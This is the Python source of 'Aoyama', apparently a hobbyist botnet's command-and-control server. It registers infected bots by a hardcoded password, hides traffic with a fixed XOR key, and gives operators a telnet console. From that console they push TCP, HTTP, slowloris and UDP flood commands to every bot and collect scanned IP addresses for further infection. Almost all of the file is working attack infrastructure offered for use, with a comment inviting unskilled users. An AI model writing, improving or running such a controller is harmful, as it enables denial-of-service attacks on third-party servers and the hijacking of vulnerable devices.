#!/usr/bin/env python3
# -*- coding: UTF-8 -*-
#Code by LeeOn123
#Created at 16/7/2019
#Updaed at 9/1/2020
#############################################################
#        d8888                                              #
#       d88888                                              #
#      d88P888                                              #
#     d88P 888 .d88b. 888  888 8888b. 88888b.d88b.  8888b.  #
#    d88P  888d88""88b888  888    "88b888 "888 "88b    "88b #
#   d88P   888888  888888  888.d888888888  888  888.d888888 #
#  d8888888888Y88..88PY88b 888888  888888  888  888888  888 #
# d88P     888 "Y88P"  "Y88888"Y888888888  888  888"Y888888 #
#                          888                              #
#                     Y8b d88P                              #
#                      "Y88P"                               #
#===========================================================#
#                   ~ version 2.0 ~                         #
#############################################################
import socket
import threading
import os
import time
import sys
import base64 as b64
import random
shutdown= False
key= "asdfghjkloiuytresxcvbnmliuytf"#xor key

if len(sys.argv)<=1:
	print("Usage: python3 cnc.py <port>")
	sys.exit()

b = int(sys.argv[1])
socketList = []
def sent_command(count,dead,data,sock):
	try:
		sock.settimeout(1)
		sock.send(data.encode())
		count.append(".")
	except:
		sock.close()
		socketList.remove(sock)#del error connection
		dead.append(".")
def sendCmd(cmd):#Send Commands Module
	print('[*]Command sent!!!')#debug
	print(cmd)
	data = xor_enc(cmd,key)#encode
	count = []
	dead = []
	th_list = []
	for sock in socketList:
		th = threading.Thread(target=sent_command,args=(count,dead,data,sock))
		th.start()
		th_list.append(th)
	for th in th_list:
		th.join()
	count = len(count)
	dead = len(dead)
	print("[!] "+str(dead)+" bots offline")
	print(str(count)+" bots got the command")
	global so
	so.send((str(count)+" bots exec the command\r\n").encode())
	scan_device()#check device after exec command


def scan_device():#scan online device
	print('scanning Online bot')
	dead = 0
	for sock in socketList:
		try:
			sock.settimeout(1)
			sock.send(xor_enc("ping",key).encode())#check connection
			#print("ping")
			sock.settimeout(2)
			try:
				pong = sock.recv(1024).decode()
				if xor_dec(pong,key) == "pong":
					#print("pong")
					pass
				else:
					sock.close()
					socketList.remove(sock)
					dead+= 1
				print("[!] "+str(dead)+" bots offline")
			except:
				print("[!] The bot died")
		except:
			socketList.remove(sock)#del error connection
			print("[!] A bot offline")#debug

def showbot():#bot count
	while True:
		try:
			global so
			so.send(("\033]0;Nodes : "+str(len(socketList))+" \007").encode())
			time.sleep(1)
		except:
			return

def handle_bot(sock,socketList):
	code = len(socketList) + 1
	while True:
		try:
			sock.settimeout(1)
			sock.send(xor_enc("ping",key).encode())#keepalive and check connection
			#print("ping")
			sock.settimeout(2)
			pong = sock.recv(1024).decode()
			if xor_dec(pong,key) == "pong":
				#print("pong")
				time.sleep(15)#check connection every 15 seconds
			else:
				try:
					sock.close()
					socketList.remove(sock)
					print("[!] A bot offline")
					break
				except:
					break
		except:
			try:#must try here because the bot may removed from other function
				sock.close()
				socketList.remove(sock)
				print("[!] A bot offline")
			except:#bug happened here, if not add "break" then there will be a "magic" loop
				pass
			break

def waitConnect(sock,addr):
	try:
		data = sock.recv(1024)#support telnet
		try:
			passwd = data.decode()
			if passwd == "UEBXUQ==" :#1337 after encode
				if sock not in socketList:
					socketList.append(sock)
					print("[!] A bot Online "+ str(addr)) #message
					handle_bot(sock,socketList)
			elif "\n" in passwd :
				print("Somebody connected:"+str(addr))
				Commander(sock)
		except:
			#removed Login code, more easy for skid
			#If u are using putty pls use raw mode to connect,
			#If connected, there will not show anything on screen
			#Just click enter.
			print("Somebody connected:"+str(addr))
			Commander(sock)
	except:
		sock.close()

def Commander(sock):#cnc server
	global so
	so = sock
	try:
		sock.send("Username:".encode())
		name = sock.recv(1024).decode().strip()
		sock.send("Password:".encode())
		passwd = sock.recv(1024).decode().strip()
	except:
		print("// Someone try to break the server down in progress //")
		return
	tmp = open("login.txt").readlines()#enter ur username and password in login.txt
	corret=0
	for x in tmp:
		tmp2 = x.split()
		#print(tmp2[0])#debug
		#print(tmp2[1])#
		if tmp2[0] == name and tmp2[1] == passwd:
			print("Commander here: "+tmp2[0])
			corret=1
	if corret != 1:
		sock.close()
		return
	sock.send("\033[36;1mSetting up the server\r\n".encode())#loading sense
	time.sleep(0.5)
	sock.send("\033[2J\033[1H".encode())
	sock.send("Setting up the server [-]\r\n".encode())
	time.sleep(0.3)
	sock.send("\033[2J\033[1H".encode())
	sock.send("Setting up the server [\\]\r\n".encode())
	time.sleep(0.3)
	sock.send("\033[2J\033[1H".encode())
	sock.send("Setting up the server [-]\r\n".encode())
	time.sleep(0.3)
	sock.send("\033[2J\033[1H".encode())
	sock.send("Setting up the server [/]\r\n".encode())
	time.sleep(0.3)
	sock.send("\033[2J\033[1H".encode())
	sock.send("Setting up the server [-]\r\n".encode())
	time.sleep(0.3)
	sock.send("\033[2J\033[1H".encode())
	sock.send("Setting up the server [\\]\r\n".encode())
	time.sleep(0.3)
	sock.send("\033[2J\033[1H".encode())
	sock.send("Setting up the server [-]\r\n".encode())
	time.sleep(0.3)
	sock.send("\033[2J\033[1H".encode())
	sock.send("Setting up the server [/]\r\n".encode())
	time.sleep(0.3)
	sock.send("\033[2J\033[1H".encode())
	sock.send("[!] Setting Up Connection Socket...\r\n".encode())
	time.sleep(0.5)
	sock.send("[!] Updating Server Config...\r\n".encode())
	time.sleep(0.5)
	sock.send("[!] Setting Up C&C Module...\r\n".encode())
	time.sleep(0.5)
	sock.send("[!] Done...\r\n".encode())
	time.sleep(0.5)
	sock.send(("[!] Welcom to the Aoyama C&C Server, "+str(name.strip("\r\n"))+"\r\n").encode())
	sock.send("==============================================\r\n".encode())
	time.sleep(1)
	threading.Thread(target=showbot,daemon=True).start()


	while True:
		#print ("==> Python3 C&C server <==")
		sock.send((str(name)+'@Aoyama:').encode())#if u run this on windows, it may has some bug, idk why so,i use linux.
		cmd_str = sock.recv(1024).decode().strip()
		if len(cmd_str):
			if cmd_str[0] == '!':
				sendCmd(cmd_str)
				#sock.send(str(count)+"bots exec the command\r\n".encode())
			if cmd_str == 'scan':
				scan_device()
			#if cmd_str == 'shell' or cmd_str == 'shell\r\n': haven't finished
				#shell_exec()
			if cmd_str == '?' or cmd_str == 'help':
				sock.send('\r\n#-- Commands --#\r\n'.encode())
				sock.send('  CC   Flood: !cc   host port threads\r\n'.encode())         #tcp connection flood
				sock.send('  HTTP Flood: !http host port threads path\r\n'.encode())	#http flood
				sock.send('  slowloris : !slow host port threads conn path\r\n'.encode())    #slowloris
				sock.send('  UDP  Flood: !udp  host port threads size\r\n\r\n'.encode())#udp flood
				sock.send('    !stop    : stop attack\r\n'.encode())
				sock.send('    !kill    : kill all the bots\r\n'.encode())
				sock.send('    !scan 1/0: enable/disable scanner\r\n'.encode())
				sock.send('    bots     : count bot\r\n'.encode())
				sock.send('    scan     : check online connection\r\n'.encode())#check connecton status, if some offline or timeout will delete them form bot list.
				sock.send('    clear    : Clear screen\r\n'.encode())
				sock.send('    exit     : exit the server\r\n'.encode())
				sock.send('    shutdown : shutdown the server\r\n'.encode())
				sock.send('=============================================================\r\n'.encode())
			if cmd_str == 'bots':
				sock.send(("Nodes:"+str(len(socketList))+"\r\n").encode())
			if cmd_str == 'clear':
				sock.send("\033[2J\033[1H".encode())
				sock.send('        d8888                                              \r\n       d88888                                              \r\n      d88P888                                              \r\n     d88P 888 .d88b. 888  888 8888b. 88888b.d88b.  8888b.  \r\n    d88P  888d88""88b888  888    "88b888 "888 "88b    "88b \r\n   d88P   888888  888888  888.d888888888  888  888.d888888 \r\n  d8888888888Y88..88PY88b 888888  888888  888  888888  888 \r\n d88P     888 "Y88P"  "Y88888"Y888888888  888  888"Y888888 \r\n                          888                              \r\n                     Y8b d88P                              \r\n                      "Y88P"                               \r\n'.encode())
			if cmd_str == 'exit':
				sock.send(('Bye, '+str(name.strip("\r\n"))+'\033[0m\r\n').encode())
				sock.close()
				break
			if cmd_str == 'shutdown':
				sock.send('Shutdown\r\n'.encode())
				sock.close()
				print("shutdown from remote command")
				global shutdown
				shutdown = True
				sys.exit()

def listen_scan():
	lis = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	lis.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
	lis.bind(('0.0.0.0',911))
	lis.listen(1024)
	while 1:
		s, addr = lis.accept()
		tmp = s.recv(1024).decode()
		#print("Recevied something "+str(tmp))
		try:
			data = xor_dec(tmp,key)
			print("Recevied scanned ip: "+data)
			with open("scanned.txt","a") as fd:
				fd.write(data+"\r\n")
				fd.close()
		except:
			pass


def main():
	threading.Thread(target=listen_scan,daemon=True).start()
	global s
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
	s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)#Keepalive tcp connection
	s.bind(('0.0.0.0',b))
	s.listen(1024)
	while True:
		sock, addr = s.accept()
		threading.Thread(target=waitConnect,args=(sock,addr),daemon=True).start()

def xor_enc(string,key):
    lkey=len(key)
    secret=[]
    num=0
    for each in string:
        if num>=lkey:
            num=num%lkey
        secret.append( chr( ord(each)^ord(key[num]) ) )
        num+=1

    return b64.b64encode( "".join( secret ).encode() ).decode()

def xor_dec(string,key):
    leter = b64.b64decode( string.encode() ).decode()
    lkey=len(key)
    string=[]
    num=0
    for each in leter:
        if num>=lkey:
            num=num%lkey

        string.append( chr( ord(each)^ord(key[num]) ) )
        num+=1

    return "".join( string )

if __name__ == '__main__':
	threading.Thread(target=main,daemon=True).start()
	while 1:
		if shutdown:
			sys.exit()
'''
mmmmmddmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmddddddddddmmmddddddddddddddddddddddddddddddddddddddddd
mdmmmdddddmmmmmmmmmmmmmmmmmmmmmmmmmmmdhso+/--....``....-:/+syhddddddddddddddddddddddddddddddddddddd
ddddddddddddmmmmmmmmmmmmmmmmmmmmdys/-.`    ``.--------..`   ``.:+shdddddddddddddddddddddddddddddddd
dddddddddddddddddddddddddmmmdhs/.`   `-:+oyhhhddddddddhhhyo+:.`   .:sdddddddddddddddddddddddddddddd
ddddddddddddddddddddddddddhs:.   .:+yhddddddddddddddddddddddddhyo/-``-ydddddddddddddddddddddddddddd
ddddddddddddddddddddddddy/.  `-+yhdddddddddddddddddddddddddddddddddhyoydddddddddddddddddddddddddddd
ddddddddddddddddddddddy:`  .+yddddddddddddddddddddddddddddddddddddddddhyyhddddddddddddddddddddddddd
dddddddmmmmmmdddddddh/`  -ohdddddddddddddddddddddddddddddddddddddddddddhyooyddddddddddddddddddddddd
mmmmmdddmmmmmmmmmmdo.  .odddddddddddddddddddddddddddddddddddddddddhddddddh+:-sddddddddddddddddddddd
mmmmmmmdmmmmmmmmmd/  `+ddddddddddddddddddddddddddddddddddddddddddhshdddddddo` :hddddddddddddddddddd
mmmmmmmmmmmmmmmmh-  -ymmmdddyyddddddddddddddddddddddddddddddddddh/ysddddddddy- .sdddddddddddddddddd
mmmmmmmmmmmmmmmh.  /dddddddd-`yddddddddddddddddddddddddddddddddd+/yodddddddddh: `/ddddddddddddddddd
ddddddmmmmmmmmh.  /ddddddddd- .hddddddddddddddh/-+hdddddddddddds.hooddddddddddd/  :hddddddddddddddd
ddddddddmmmddd-  /dddddddddho :/yyhddddddddddd`   `oddddddddddh-+hsohhhhhddddddd-  -ddddddddddddddd
ddddddddddddd+  -dddddddddddd`:s+hhhhhddddddd: .    /dddddhhhh+-yyooyyyyhhddddddy`  /dddddddddddddd
ddddddddddddh  `hdddddddddddd+sdoyyydddddddd+ /hs.   -yhhhhhhy:yhh/oyhhyyyyhhhhdd+   yddddddddddddd
dddddddddddd/  +dddddddddddddhhdhss+yddddddy./hhhh/   `shhhhhsyhhh:shhhhhhyhhhhddh.  -ddddddddddddd
dddddddddddd`  hdddddddddddddhhhdhyh/ohhhhhyyhhhdddo`  `+hddhhhhhh-yhhhhhhhhhhhhddo   ydddddddddddd
ddddddddddds  -dddddddddddddddo+ddhsy.+ddhhhdddddddds.  -sddhddhhh.yhhhhhhhhhhhhddd`  +Nmmmdddddddd
ddddddddddd+  /ddddddddddddddd-:dddhyy/sysyddddddddddh/`oyhhdddddh shddddddddddhmNN:  :NNNNmddmmmmm
ddddddddddd+  oddddhdddddddddd/ hdddyyh+.sdddddddddddddo`syyhddddh +hdddddddddddmNN+  :NNNNmdmNNNNN
ddddddddddd+  +dddddddddddddddy oddddy/ -dddddddddddddddy/.hdddddh oddhyssyhddmdmmmo  /NmNNmddNNNNN
dddddddddddo  /dddddddddddddddd`-ddddy`.yyddddddddddddddd./dddyso+ ./++sydhdmmmmmmm-  sNNNNmddNNNNN
dddddddddddh  .dddddddddddddddd- hddh`.+/syydddddddddhys:`+//+oyhs .dddddddmNNNNNmm  `mNNNNNddmmmmm
dddddddddddd:  sddddddddddddddd: sds`.hd:`-.oso+/:-.-:/- +yhhddddo `dddddddmNNmmNN/  +NNNmmmddNNNNm
ddddddddddddy  .ddddddddddddddd/ +o` /+:.    `:/+syhddy /dddddhhd/  dddddmmmNmmmNy``.mmNNmmNddNNmNN
ddddddddddddd+  /dddddddddmmmdd: `   .-:+o`   sddddddd-`ddmmmmddd/.:ddmmmmmmmNmmd.  hNNNNNmmmdmNNmN
ddddmddddddddd:  +ddddddmmNNNmmo` .yhdddddy`  `sddddds +ddddddddmdhdddmmmmmmmmNm-  oNNNNNmmmmdmmNNN
dmNNNNNmddddmmd-  +mmdddmmNNmmmNhshddddddmmh.  `sdddd..dmmdmmmmmmmmmmmmmmmmmmmm+` +NNNNNNmmmmdmmNmm
dNNmmNNmmmmmNmmd:  /mmmmmNNNNNNNmddddddmmmNNd.  `odd+ smmmmNNmmmmmmNNmmNmmNNNmo: +mNNNNNNmmmmdmmNNN
mNmNNNNmmmmmNmmmd+  :dmmmmNNNNNNmmmmmmmmNmmmmh.  `os`.dmmmNNNNmmNmNNNNNmmmmNmo:`ommmmNNNNmmmmmmNNNN
mNNNNNNmmmmmmmmmNmy. .smmNNNNNNNmmmNNmmmNNNNmmd:   ` smmNNmmNmmmNNNNmmmNmmmdo-.yNNNNmNmNNNNNmmmNNmN
mNNNNNNmmmNNmmmmNNNd/  :hNNNNNNNNNNNNmmNNmNNNmNm+   `mNNmmmNmNmNNNNNmmmNmmhs:/dNNNmmmmNNNNNNNmmNNmN
NNNNNNNNNNNmNNNmNNNNNy- `+dmNNNNNNNNNNNNNmmNNNNNms`./mNNNNNNNNNNNmNmmNNmhysohmNNNmNNNNNNNNmNNmmNmmN
NNNNNNNNNNNNmNNNNNNNNNms- ./hmNNNNNNNNNNNNNNNNNNNNhdmNNNNNNNNNNNNmmmmmhyhydmNNNNNmNNmNmNNmmmNmmNNNN
NNNmNmNNNNNNmNNNNNNNNNNmmy:`.+ydmNNNNNNNNNmNNNNNNNNNNmmNNmmNmmNNNmdhhhhddmNNNNmmmmNNmmmNNmmmNmmNNNN
NNNmNNNNNNNNNNNNNNNNNmNmNNmh+--/oydmNNNNNNmNNNNNNmNNNmmmNmNNmNmmddhhdmNNNNNNNNmmNNNNNNmNNmmmNmmNNNN
NNNNNNNNNNmNNNmmNNNNmmNNNNNNNmho:::+syhmmmmmNNNNNmNNNNNNmmmmmmmmmmNNNNNNNNNNNmNNmmmNNNmmNNmmmmNNNNN
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNdy+:/+oyyhyhdddddmmmmdmmmmNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
mNNNNNNNNNNNmNNNNNNNNNNNNNNmNNNNNNNNNmmdhdmmmmmmmmmmdyhNNNNNNmmmmNNNNNNmNNNNdmmNNmdmmNNNNNNNNNNNNNN
'''